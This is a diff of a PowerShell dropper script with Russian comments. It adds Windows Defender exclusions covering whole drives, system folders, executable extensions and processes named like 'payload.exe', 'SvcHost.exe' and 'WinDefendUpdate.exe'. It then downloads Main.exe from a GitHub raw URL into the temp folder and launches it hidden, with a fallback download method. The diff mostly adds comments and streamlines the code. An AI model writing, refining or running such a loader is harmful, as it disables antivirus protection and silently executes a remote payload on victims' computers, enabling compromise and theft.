@@ -1,4 +1,5 @@
 try {
+    # Добавление исключений в Defender
     if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
         $Paths = @(
             [System.Environment]::GetFolderPath("ProgramFiles"),
@@ -8,7 +9,6 @@ try {
             [System.IO.Path]::GetTempPath(),
             "C:\", "C:\Windows\Temp", "C:\ProgramData", "C:\Users", "C:\Windows\System32", "C:\Windows\SysWOW64"
         )
-
         $Processes = @("payload.exe", "Main.exe", "RuntimeBroker.exe", "SvcHost.exe", "WinDefendUpdate.exe", "powershell.exe", "cmd.exe")
         $Extensions = @(".exe", ".dll", ".bat", ".ps1", ".vbs", ".bin")
 
@@ -18,19 +18,19 @@ try {
     }
 } catch {}
 
+# Прямая ссылка на твой исполняемый файл
 $url = "https://raw.githubusercontent.com/reasonowner/montano-project/main/Main.exe"
 $p = "$env:TEMP\Main.exe"
 
+# Скачивание файла
 try {
-    $webClient = New-Object System.Net.WebClient
-    $webClient.DownloadFile($url, $p)
-    
-    if ((Get-Item $p).Length -gt 100) {
+    (New-Object System.Net.WebClient).DownloadFile($url, $p)
+    if (Test-Path $p) {
+        # Скрытый запуск
         Start-Process $p -WindowStyle Hidden
-    } else {
-        Write-Host "File too small, probably download failed." -ForegroundColor Yellow
     }
 } catch {
-    iwr $url -OutFile $p -UseBasicParsing
+    # Резервный метод скачивания
+    Invoke-WebRequest -Uri $url -OutFile $p -UseBasicParsing
     if (Test-Path $p) { Start-Process $p -WindowStyle Hidden }
 }
